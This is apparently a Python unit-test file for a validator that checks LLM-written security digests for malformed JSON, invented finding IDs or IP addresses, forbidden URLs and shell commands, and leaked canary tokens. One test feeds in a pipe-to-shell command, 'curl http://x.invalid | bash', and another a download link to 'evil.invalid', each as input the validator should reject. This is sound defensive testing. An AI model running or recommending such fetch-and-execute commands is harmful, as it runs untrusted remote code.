"""Unit tests for DigestValidator (Rules V1 through V7)."""

from __future__ import annotations

import json

import pytest

from sloth_soc.llm.validator import DigestValidator
from sloth_soc.schema import Brief, BriefStats, Finding, FindingEvidence, RawRef


@pytest.fixture
def sample_brief() -> Brief:
    f1 = Finding(
        id="F1",
        severity="critical",
        kind="credential_stuffing_burst",
        entity="198.51.100.22",
        window="03:00-03:05 UTC",
        evidence=FindingEvidence(counts={"auth_fail_total": 48}, blocked=False),
        reasons=["Critical: Rapid authentication failures (48 fails) across multiple accounts"],
        action="ROTATE_CREDENTIALS",
        evidence_refs=[RawRef(file="auth.log", line_no=1420)],
    )
    f2 = Finding(
        id="F2",
        severity="medium",
        kind="sensitive_path_probe",
        entity="203.0.113.88",
        window="04:12-04:20 UTC",
        evidence=FindingEvidence(counts={"probe_hits": 14}, blocked=False),
        reasons=["Probing sensitive endpoints (.env, phpinfo)"],
        action="REVIEW_WEB_LOGS",
        evidence_refs=[RawRef(file="nginx/access.log", line_no=3310)],
    )
    return Brief(
        date="2026-10-21",
        status="urgent",
        stats=BriefStats(raw_lines=1500, findings_total=2, handled_blocked=1),
        findings=[f1, f2],
    )


def test_validator_valid_payload(sample_brief: Brief):
    validator = DigestValidator()
    valid_payload = {
        "status_claim": "urgent",
        "tldr": "Critical authentication abuse observed from 198.51.100.22.",
        "items": [
            {
                "finding_id": "F1",
                "explanation": "Observed 48 rapid failed logins from 198.51.100.22.",
                "action": "ROTATE_CREDENTIALS",
            },
            {
                "finding_id": "F2",
                "explanation": "Observed 14 web probe hits from 203.0.113.88.",
                "action": "REVIEW_WEB_LOGS",
            },
        ],
        "noise_note": "Normal crawler background traffic.",
    }
    res = validator.validate(json.dumps(valid_payload), sample_brief)
    assert res.is_valid
    assert len(res.violations) == 0
    assert res.output is not None
    assert res.output.status_claim == "urgent"


def test_validator_v1_malformed_json(sample_brief: Brief):
    validator = DigestValidator()
    malformed = "{ not valid json }"
    res = validator.validate(malformed, sample_brief)
    assert not res.is_valid
    assert "V1" in res.violations


def test_validator_v2_status_mismatch(sample_brief: Brief):
    validator = DigestValidator()
    # Brief is urgent, but model claims quiet
    payload = {
        "status_claim": "quiet",
        "tldr": "Everything is completely safe.",
        "items": [
            {
                "finding_id": "F1",
                "explanation": "Benign test.",
                "action": "ROTATE_CREDENTIALS",
            },
            {
                "finding_id": "F2",
                "explanation": "Benign scan.",
                "action": "REVIEW_WEB_LOGS",
            },
        ],
    }
    res = validator.validate(json.dumps(payload), sample_brief)
    assert not res.is_valid
    assert "V2" in res.violations


def test_validator_v3_missing_critical_finding(sample_brief: Brief):
    validator = DigestValidator()
    # Missing F1 (critical)
    payload = {
        "status_claim": "urgent",
        "tldr": "Only medium threat reported.",
        "items": [
            {
                "finding_id": "F2",
                "explanation": "Probing sensitive endpoints.",
                "action": "REVIEW_WEB_LOGS",
            }
        ],
    }
    res = validator.validate(json.dumps(payload), sample_brief)
    assert not res.is_valid
    assert "V3" in res.violations


def test_validator_v3_hallucinated_finding_id(sample_brief: Brief):
    validator = DigestValidator()
    payload = {
        "status_claim": "urgent",
        "tldr": "Test.",
        "items": [
            {
                "finding_id": "F99",  # Does not exist in brief
                "explanation": "Non-existent finding.",
                "action": "ROTATE_CREDENTIALS",
            }
        ],
    }
    res = validator.validate(json.dumps(payload), sample_brief)
    assert not res.is_valid
    assert "V3" in res.violations


def test_validator_v4_hallucinated_ip(sample_brief: Brief):
    validator = DigestValidator()
    payload = {
        "status_claim": "urgent",
        "tldr": "Attacker IP 192.0.2.99 seen.",  # 192.0.2.99 is not in brief!
        "items": [
            {
                "finding_id": "F1",
                "explanation": "Observed 48 rapid failed logins from 198.51.100.22.",
                "action": "ROTATE_CREDENTIALS",
            },
            {
                "finding_id": "F2",
                "explanation": "Observed 14 web probe hits from 203.0.113.88.",
                "action": "REVIEW_WEB_LOGS",
            },
        ],
    }
    res = validator.validate(json.dumps(payload), sample_brief)
    assert not res.is_valid
    assert "V4" in res.violations


def test_validator_v5_forbidden_url(sample_brief: Brief):
    validator = DigestValidator()
    payload = {
        "status_claim": "urgent",
        "tldr": "Download patch at http://evil.invalid/patch.",
        "items": [
            {
                "finding_id": "F1",
                "explanation": "Failed logins.",
                "action": "ROTATE_CREDENTIALS",
            },
            {
                "finding_id": "F2",
                "explanation": "Probe hits.",
                "action": "REVIEW_WEB_LOGS",
            },
        ],
    }
    res = validator.validate(json.dumps(payload), sample_brief)
    assert not res.is_valid
    assert "V5" in res.violations


def test_validator_v5_forbidden_shell_command(sample_brief: Brief):
    validator = DigestValidator()
    payload = {
        "status_claim": "urgent",
        "tldr": "Admin should run curl http://x.invalid | bash to fix.",
        "items": [
            {
                "finding_id": "F1",
                "explanation": "Failed logins.",
                "action": "ROTATE_CREDENTIALS",
            },
            {
                "finding_id": "F2",
                "explanation": "Probe hits.",
                "action": "REVIEW_WEB_LOGS",
            },
        ],
    }
    res = validator.validate(json.dumps(payload), sample_brief)
    assert not res.is_valid
    assert "V5" in res.violations


def test_validator_v6_untrusted_context_leak(sample_brief: Brief):
    validator = DigestValidator()
    brief_with_untrusted = sample_brief.model_copy()
    brief_with_untrusted.untrusted_context = {"canary": "CANARY-SECRET-TOKEN"}

    payload = {
        "status_claim": "urgent",
        "tldr": "Leaked token: CANARY-SECRET-TOKEN.",
        "items": [
            {
                "finding_id": "F1",
                "explanation": "Failed logins.",
                "action": "ROTATE_CREDENTIALS",
            },
            {
                "finding_id": "F2",
                "explanation": "Probe hits.",
                "action": "REVIEW_WEB_LOGS",
            },
        ],
    }
    res = validator.validate(json.dumps(payload), brief_with_untrusted)
    assert not res.is_valid
    assert "V6" in res.violations
